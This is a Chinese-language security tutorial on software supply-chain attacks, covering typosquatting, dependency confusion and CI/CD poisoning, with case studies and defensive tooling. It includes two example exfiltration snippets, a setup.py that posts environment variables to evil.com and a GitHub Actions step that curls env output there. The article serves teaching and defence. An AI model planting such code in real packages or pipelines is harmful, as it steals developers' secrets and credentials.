---
title: 供应链攻击实战：从软件依赖到 CI/CD 投毒
slug: kali-4供应链攻击-cicd投毒-4d5e6
date: 2026-09-12
visibility: public
tags: Kali Linux, 供应链攻击, CI/CD, 软件依赖, 投毒, 安全, 教程
---

# 供应链攻击实战：从软件依赖到 CI/CD 投毒

> SolarWinds、log4j、XZ Utils 后门……近年来最轰动的事件都指向同一个方向：**供应链攻击**。攻击者不再直接打目标，而是打目标的"上游"——软件依赖、构建流程、供应商。本文讲透供应链攻击的套路与防御。

## 一、供应链攻击面

```
供应链攻击
├─ 开源依赖（npm/pypi/maven 恶意包）
├─ 构建系统（CI/CD 投毒）
├─ 软件供应商（正规软件带后门）
├─ 固件/硬件（设备出厂植入）
└─ 第三方服务（云服务商被攻陷）
```

## 二、依赖投毒：最廉价的攻击

### 原理

开发者 `pip install` / `npm install` 时，会从公共仓库拉取依赖。攻击者上传**同名恶意包**（typosquatting）或**污染已存在的包**。

### 常见手法

| 手法 | 说明 |
|------|------|
| 拼写劫持 | `pip install requst`（故意拼错） |
| 依赖混淆 | 内网私有源名字冲突 |
| 版本污染 | 篡改已发布版本 |
| 抢注 | 提前注册热门包名 |

### 恶意包行为

```python
# 例子：一个看似正常的 setup.py
# 安装时悄悄回传环境变量
import os, requests
requests.post("http://evil.com/c2", data={
    "env": str(os.environ),
    "pwd": os.getcwd()
})
```

## 三、CI/CD 投毒

CI/CD（持续集成/交付）是自动构建发布的流水线，一旦被攻陷，等于给产品装后门。

### 攻击入口

```
1. 攻陷开发者账号（GitHub 令牌/SSH key）
2. 注入恶意代码到依赖（依赖混淆）
3. 攻击构建服务器（未隔离的 Runner）
4. 篡改制品仓库（artifact 替换）
5. 污染测试/发布脚本
```

### 利用 CI/CD 投毒

```bash
# 假设拿到了 GitHub Actions 的权限
# 在 workflow 中插入恶意步骤
- name: Exfiltrate secrets
  run: |
    curl -d "$(env)" http://evil.com/
```

## 四、供应链攻击案例分析

| 案例 | 攻击方式 | 影响 |
|------|---------|------|
| SolarWinds | 篡改构建产物 | 数千家企业被入侵 |
| log4j | 开源库漏洞（CVE-2021-44228） | 全球 Java 系统 |
| event-stream | npm 包被植入恶意代码 | 加密货币窃取 |
| XZ Utils | 后门植入开源库 | Linux 系统风险 |

## 五、检测与防御

### 开发侧（供应链安全）

```
1. 锁版本（lockfile）+ 校验和
2. 依赖扫描（OSV Scanner / Snyk / Dependabot）
3. 最小化依赖（不用的别装）
4. CI/CD 隔离（Runner 最小权限）
5. 制品签名（SBOM / 签名验证）
```

### Kali 检测工具

```bash
# 扫描 Python 依赖漏洞
pip-audit

# 扫描 Node 依赖
npm audit

# 通用漏洞扫描
osv-scanner -r .
```

## 六、渗透视角

```
1. 评估目标 CI/CD：Jenkins / GitLab / GitHub Actions
2. 找暴露的 CI 面板（弱口令/未授权）
3. 找泄露的 .env / 部署密钥
4. 检查依赖锁定是否严谨（可利用投毒）
5. 检查制品发布是否签名
```

## 安全合规

> 供应链攻击是严重违法犯罪行为。本文仅供**防御者识别风险**与授权测试使用，严禁利用投毒攻击他人。

## 小结

- 供应链攻击"打一家、伤全网"，是最高危的攻击形态
- 依赖投毒（npm/pypi）是入门级攻击面
- CI/CD 凭据是供应链的核心资产
- 锁版本、签名验证、SBOM 是基础防线
- 攻击供应链的本质是"信任链"的攻击

> 下一篇：自动化渗透测试——从脚本到编排平台。